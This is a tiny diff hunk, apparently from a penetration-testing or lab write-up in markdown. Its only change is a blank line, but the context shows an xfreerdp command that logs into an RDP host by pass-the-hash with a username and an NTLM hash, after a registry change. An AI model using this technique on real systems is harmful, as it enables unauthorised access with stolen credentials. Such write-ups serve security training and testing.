@@ -135,3 +135,4 @@ Once the registry key is added, we can use xfreerdp with the option /pth to gain
 ```
  xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
 ```
+
